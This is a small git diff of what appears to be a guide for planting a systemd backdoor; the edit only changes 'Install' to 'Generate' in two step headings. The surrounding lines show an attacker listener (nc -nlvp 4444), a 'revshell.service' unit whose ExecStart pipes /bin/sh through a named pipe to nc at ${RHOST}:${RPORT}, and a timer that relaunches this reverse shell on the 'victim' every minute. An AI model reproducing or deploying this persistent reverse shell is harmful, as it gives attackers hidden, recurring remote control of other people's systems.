@@ -37,7 +37,7 @@ The service file (`revshell.service`) uses:
 $ nc -nlvp 4444
 ```
 
-2. Install a service file to create the backdoor on the victim
+2. Generate a service file to create the backdoor on the victim
 ```ini
 $ cat revshell.service
 ; https://www.freedesktop.org/software/systemd/man/systemd.service.html
@@ -53,7 +53,7 @@ ExecStartPre=/bin/sh -c "find /tmp/backpipe || mknod --mode=0666 /tmp/backpipe p
 ExecStart=/bin/sh -c "/bin/sh 0</tmp/backpipe | /bin/nc ${RHOST} ${RPORT} 1>/tmp/backpipe"
 ```
 
-3. Install a timer file to execute the backdoor at regular intervals (every minute in our case)
+3. Generate a timer file to execute the backdoor at regular intervals (every minute in our case)
 ```ini
 $ cat revshell.timer
 ; https://www.freedesktop.org/software/systemd/man/systemd.timer.html
